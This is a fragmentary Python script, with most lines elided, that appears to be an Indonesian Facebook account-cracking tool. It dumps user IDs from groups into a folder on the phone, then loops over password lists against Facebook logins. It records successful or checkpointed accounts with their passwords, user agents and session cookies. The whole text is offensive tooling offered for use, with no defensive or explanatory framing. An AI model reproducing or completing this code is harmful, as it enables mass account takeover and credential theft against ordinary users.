...
try:
	...
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mKang_Cabul_xy')
...
def menu(my_name,my_id):
	...
	cetak(nel(oi, title='[bold cyan] • MENU CROOT • [/bold cyan]'))
...
#-----------------[ HASIL-CABUL ]-----------------#
def result():
	print(f'>> 1. Hasel {h}OK{x} Anda ')
	print(f'>> 2. Hasel {k}CP{x} Anda ')
	print('>> 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('MAU NYABUL BERAPA? : '))
	except ValueError:
...
def grup():
	...
	if berr2=='Masuk Facebook':
		...
		kangcabul_xy('>> Grup Tidak Di Temukan ')
		time.sleep(0.5)
		grup()
	else:pass
...
#-------------[ CROOT-FROM-FILE ]------------------#
def crack_file():
	try:vin = os.listdir('/sdcard/CABUL-DUMP')
	except FileNotFoundError:
	...
	if len(vin)==0:
		...
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/CABUL-DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/CABUL-DUMP/'+geh,'r').read().splitlines()
		except:
...
def passwrd():
	os.system('clear')
	jalan(f'{M}CbL Jatim {h}RizalCyberXx ')
	print('')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{H}[NYABUL] {P}{b}{loop}{P}/{u}{len(id)}{P}/{P}{H}{ok}{P}/{P}{k}{cp}{x}/{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				statuscp = f'[•]ID:{idf}\[•]KATASANDI:{pw}\n[•]UA:{ua}'
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='KANG-CABUL CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='KANG-CABUL OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]KANG-CABUL OK[/bold green]'))
					ok+=1
					break
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/CABUL-DUMP')
	except:pass
